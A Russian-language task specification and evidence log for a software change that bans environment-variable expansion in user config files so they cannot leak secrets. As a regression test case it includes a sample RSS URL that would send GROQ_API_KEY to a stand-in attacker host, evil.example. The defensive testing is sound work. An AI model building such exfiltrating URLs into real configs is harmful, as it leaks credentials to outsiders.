---
id: 012
size: M
status: done
reopened: false
---

# Запрет раскрытия переменных окружения в файлах всех пользователей (#22)

## Goal

Файл пользователя из DATA_REPO, включая файл владельца, не может раскрывать `${VAR}` и выводить секреты окружения через URL источника.

## Context

- Причина: PAT бота может менять файл владельца в DATA_REPO, а load_user доверяет ему и вызывает _expand_env_vars. Ограничение PAT одним репозиторием данных не устраняет этот путь утечки.
- Пользователь выбрал запрет ссылок на env для всех, сохранив HORIZON_OWNER_ID и существующие особенности владельца для источников и Hacker News.
- Разрешено менять существующие проверки tests/test_users.py, ожидающие раскрытия env у владельца, и добавлять регрессионные проверки нового контракта.
- Проверка локальная, на синтетических данных, без отправки дайджеста, доступа к личным данным и деплоя.

## Acceptance criteria

1. Given JSON-файл владельца или другого пользователя с `${NAME}` в любом вложенном значении или ключе When load_user загружает файл Then возникает ConfigError до раскрытия переменных и применения источников, независимо от наличия NAME в окружении и корректности HORIZON_OWNER_ID.
2. Given подменённый файл владельца с RSS URL `https://evil.example/feed?k=${GROQ_API_KEY}` и синтетическим секретом в окружении When файл загружается Then ConfigError содержит имя переменной и путь файла, не содержит значение секрета, сетевых запросов нет.
3. Given корректный файл владельца без ссылок на env When load_user и apply_overlay вызываются локально Then конфиг собирается, chat_id берётся из явного значения или id пользователя; базовые источники сохраняются при отсутствии пользовательских sources; раскрытие env в базовом конфиге не меняется.
4. Given владелец и другой пользователь без ссылок на env When загружаются их источники Then сохраняются существующие ограничения обычных пользователей, возможности владельца и правила включения Hacker News; HORIZON_OWNER_ID остаётся источником определения роли.
5. Given невалидный id, несовпадение id с именем файла или попытка чтения пути другого ресурса через user_id When load_user вызывается Then существующие проверки отклоняют ввод; запрет env их не ослабляет.
6. Given файл с запрещённой ссылкой на env и publish_site=true When due_users строит матрицу Then файл остаётся в матрице как невалидный с publish_site=false для видимого провала его джобы; остальные пользователи обрабатываются как раньше.
7. Given обновлённая документация When читаются ADR 0002 и docs/multi-user.md Then прежнее исключение владельца явно отменено, описаны запрет env во всех пользовательских файлах, сохранённая роль HORIZON_OWNER_ID и миграция к явным значениям либо настройкам в базовом конфиге; новое архитектурное решение оформлено ADR по правилам проекта.
8. Given завершённые изменения When запускаются целевые тесты tests/test_users.py и полный uv run pytest Then проверки проходят; /verify и /review-diff имеют доказательства после последней правки. Живая доставка не считается проверенной.

## Negative scenarios

- N1: Given существующая или отсутствующая переменная в chat_id, RSS URL, имени источника либо вложенном ключе When загрузка от владельца или другого пользователя Then ConfigError без значения секрета.
- N2: Given отсутствующий или невалидный HORIZON_OWNER_ID When пользовательский файл с env-ссылкой загружается Then запрет действует без исключений.
- N3: Given обычный `$name` без фигурных скобок When файл загружается Then строка остаётся допустимой, прежняя семантика распознавания `${NAME}` сохраняется.

## Scope

- Change: src/users/__init__.py, tests/test_users.py, новый tests/test_user_env_refs.py, docs/multi-user.md, docs/decisions/0002-owner-only-env-expansion.md, новый ADR в docs/decisions/, этот файл задачи и общее состояние .claude/state/ (active-task, handoff.md).
- Do NOT touch: bot/, workflow, scripts/setup.sh, реальные файлы DATA_REPO, базовый конфиг и механизм раскрытия env в src/storage/manager.py, другие задачи и проблемы релиза. Коммит, push, запуск рассылки и деплой не входят в задачу.
- Pattern: существующий _reject_env_refs и проверки запрета для обычного пользователя в tests/test_users.py; общий guard до ветвления по владельцу; существующие тесты apply_overlay и due_users для совместимости.

## Plan

1. Обновить проверки прежнего исключения владельца и добавить регрессию для вложенных ссылок, чужого URL и отсутствующей переменной; получить ожидаемые падения до изменения кода.
2. Применить _reject_env_refs ко всем файлам до ветвления по владельцу, убрать раскрытие env и скорректировать сообщение защитной проверки apply_overlay.
3. Оформить ADR 0004, отменить ADR 0002 и описать миграцию в multi-user.md.
4. Выполнить целевые и полные тесты, /verify и независимый /review-diff; записать доказательства и актуализировать handoff.

## Evidence

| AC | Как проверено | Результат |
|----|---------------|-----------|
| AC1 | `uv run pytest tests/test_users.py tests/test_user_env_refs.py` → 124 passed; test_all_user_files_reject_nested_env_refs: 48 сочетаний роли, owner id, наличия env и места ссылки | PASS |
| AC2 | Тот же параметризованный тест: URL evil.example, синтетический GROQ_API_KEY, отказ в сетевом вызове, проверка пути/имени переменной и отсутствия значения секрета; test_owner_file_cannot_reference_secrets | PASS |
| AC3 | test_owner_without_sources_uses_base_config_env: StorageManager.load_config + load_user + apply_overlay на синтетических файлах; test_load_owner_with_explicit_chat; тесты overlay defaults/without_sources | PASS |
| AC4 | tests/test_users.py: test_owner_sources_are_not_restricted, test_owner_sources_keep_hackernews_off_unless_enabled, test_non_owner_allowed_sources_load_without_hackernews и allowlist/limit checks в целевом прогоне | PASS |
| AC5 | tests/test_users.py: test_load_user_rejects_invalid_ids, test_load_user_rejects_foreign_id, test_load_user_rejects_invalid_files → целевой прогон зелёный | PASS |
| AC6 | test_due_users_does_not_need_chat_env и test_due_users_marks_non_owner_env_refs_broken → целевой прогон зелёный | PASS |
| AC7 | Прочитаны ADR 0004, статус superseded ADR 0002 и обновлённый multi-user.md; `rg -n '0004|HORIZON_OWNER_ID|chat_id|sources' docs/multi-user.md docs/decisions/0004-reject-user-env-refs.md` подтверждает контракт и миграцию | PASS |
| AC8 | Целевой прогон → 124 passed in 1.05s; `uv run pytest` → 1175 passed in 58.70s; `git diff --check` → exit 0. Независимое ревью записано отдельной строкой ниже | PASS |
| N1 | test_all_user_files_reject_nested_env_refs + test_owner_file_cannot_reference_secrets, test_non_owner_chat_id_cannot_reference_env | PASS |
| N2 | test_all_user_files_reject_nested_env_refs покрывает None/invalid HORIZON_OWNER_ID; test_env_refs_need_owner_id покрывает также пустую строку | PASS |
| N3 | test_plain_dollar_is_not_an_env_ref в tests/test_users.py | PASS |
| review | Независимый read-only reviewer через fallback ADAPTERS (роль reviewer недоступна), раунд 1: FINDING 0; NOT VERIFIED 1 (живая доставка, деплой и CI вне scope) | PASS |

До правки production-кода обновлённые tests/test_users.py дали 3 failed, 72 passed: исключение владельца и publish_site у невалидного файла воспроизведены. В новом интеграционном тесте исправлены синтетические данные (обязательное ai.api_key_env); проверки не ослаблялись.

Живая доставка, деплой и CI для текущего diff не выполнялись: вне согласованного scope. Личные файлы DATA_REPO не читались и не менялись.

## Knowledge

- Dead ends: none
- Decisions: [ADR 0004](../docs/decisions/0004-reject-user-env-refs.md): сохранить особенности владельца, отменить только раскрытие env; проверять без живой доставки.
- Known issues: остальные поля источников владельца, читающие секреты по имени (например apify_token_env), относятся к отдельной поверхности доверия и этим изменением не закрываются; полный аудит таких полей вне scope.
